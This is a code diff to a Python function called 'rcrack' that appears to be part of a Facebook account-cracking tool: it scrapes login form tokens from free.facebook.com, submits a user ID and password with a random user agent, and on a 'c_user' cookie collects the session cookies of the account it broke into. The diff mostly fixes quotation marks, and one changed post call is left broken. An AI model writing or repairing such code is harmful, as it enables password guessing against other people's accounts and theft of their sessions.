@@ -237,15 +237,15 @@ def rcrack(uid,pwx,tl):
             pro = random.choice(agents)
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
-                :lsd::re.search('name='lsd' value='(.*?)'', str(free_fb)).group(1),
-            'jazoest':re.search('name='jazoest' value='(.*?)'', str(free_fb)).group(1),
-            :m_ts":re.search('name='m_ts' value='(.*?)'', str(free_fb)).group(1),
-            'li':re.search('name="li" value="(.*?)'', str(free_fb)).group(1),
-            'try_number':'0',
-            'unrecognized_tries':'0',
-            'email":uid,
-            'pass":ps,
-            'login':'Log In'}
+               "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
             header_freefb = {'authority': 'facebook.com',
             'method': 'GET',
             'scheme': 'https',
@@ -260,7 +260,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-mode': 'no-cors',
             'sec-fetch-site': 'same-site',
             'user-agent': pro}
-            lo = session.post('https://facebook.com/security/hsts-pixel.gif', params=params, cookies=cookies, headers=headers)).text
+            lo = session.post().text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
